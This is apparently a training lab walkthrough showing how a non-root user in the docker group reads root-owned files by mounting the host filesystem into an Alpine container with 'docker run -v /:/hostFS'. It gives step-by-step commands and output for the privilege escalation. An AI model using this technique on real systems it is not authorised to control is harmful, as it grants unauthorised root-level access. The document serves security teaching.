## Authentication Attacks against Host

###### A `non-root user` with access to docker can `gain access to root filesystem of the host machine` by using a feature of docker called `Volume Expose`. 

###### In this attack, a `non-root` user can launch a container by using the `-v /:/hostFS` flag to mount the entire host file-system to the container launched. Changes made to the mounted file-system in the container reflects on the host file-system as well.


##### Step 1:

* Open Terminal

![](img/Open-Terminal.png)


##### Step 2:

* Run `whoami` to confirm that you are the `root` user.
    
```commandline
root@we45:~# whoami
root
root@we45:~#
```

* Run `sudo su` to become root user, if you are NOT the `root` user already

```commandline
we45@we45:~# sudo su
root@we45:~#
```


##### Step 3:

* Create a `secret.txt` file in the `/root/` directory, write some secret in it and save the file.

```commandline
root@we45:~# touch /root/secret.txt
root@we45:~# 
root@we45:~# mousepad /root/secret.txt
```


###### A `non-user` by default does not have access to docker.


##### Step 4:

* Give `we45` user access to `docker`.

```commandline
root@we45:~# usermod -aG docker we45
root@we45:~#
```

* `Note`: Close and re-open the terminal for changes to take effect. It might be necessary to logout and log back in.


##### Step 5: 
  
* Run `sudo su we45` to login as a normal user.

```commandline
root@we45:~# sudo su we45
we45@we45:~$
```
    
* Check if the user `we45` has access to `docker` by running `docker images` and `docker ps`

```commandline
we45@we45:~$ docker images
we45@we45:~$ docker ps
```


##### Step 6: 
  
* Run `cat /root/secret.txt` read the content of `secret.txt` file that was created by `root` user.

```commandline
we45@we45:~$ cat /root/secret.txt
cat: /root/secret.txt: Permission denied
```

* Since the user does not have `root` privileges, permission to read/write the file will be denied


##### Step 7:

* Run `docker run -ti --rm -v /:/hostFS/ alpine` as `we45`(non-root user)

```commandline
we45@we45:~$ docker run -ti -v /:/hostFS/ alpine
/ #     
```
    
* By running this, a `non-root user` has mounted the host Filesystem to the docker container which the user has access to.


##### Step 8:

* Run `cd /hostFS/root/` to access the mounted host directory. Run `ls` to check the secret.txt file inside a container.

```commandline
/ # cd /hostFS/root/
/hostFS/root # 
/hostFS/root # ls
secret.txt
```


##### Step 9:

* Run `cat secret.txt` to view the content of the file.

```commandline
/hostFS/root # cat secret.txt
secret
``` 

###### Now, the `non-root user` has the privilege to view the root user data. Changes made to the file in the container will be reflected on the Host Filesystem as well.


##### Step 10:

* Run `exit` to exit from the container.

```commandline
/hostFS/root # exit
we45@we45:~$
```


##### Stop all running docker containers

* Run `clean-docker` to stop all the containers

```commandline
root@we45:~$ clean-docker
```
